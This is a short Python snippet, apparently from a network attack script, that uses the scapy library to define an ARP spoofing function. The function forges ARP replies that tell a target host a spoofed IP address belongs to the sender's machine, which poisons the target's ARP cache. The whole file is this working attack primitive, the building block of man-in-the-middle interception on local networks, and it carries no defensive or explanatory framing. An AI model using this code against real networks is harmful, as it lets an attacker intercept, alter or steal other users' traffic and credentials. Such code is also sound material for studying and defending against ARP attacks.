import scapy.all as sc

def arp_spoof (target_ip, spoofed_ip, target_mac):
    packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    sc.send(packet, verbose=False)